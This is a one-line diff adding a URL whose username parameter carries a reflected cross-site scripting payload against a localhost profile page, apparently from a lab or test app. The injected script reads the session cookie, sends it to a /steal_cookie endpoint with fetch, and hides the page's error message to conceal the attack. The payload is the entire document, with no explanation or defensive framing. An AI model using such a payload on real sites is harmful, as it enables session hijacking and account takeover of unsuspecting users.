@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=user1<script>const sessionToken = document.cookie.replace("session=","");fetch(`http://localhost:3000/steal_cookie?cookie=${sessionToken}`);document.getElementsByClassName("error")[0].style.display="none";</script>
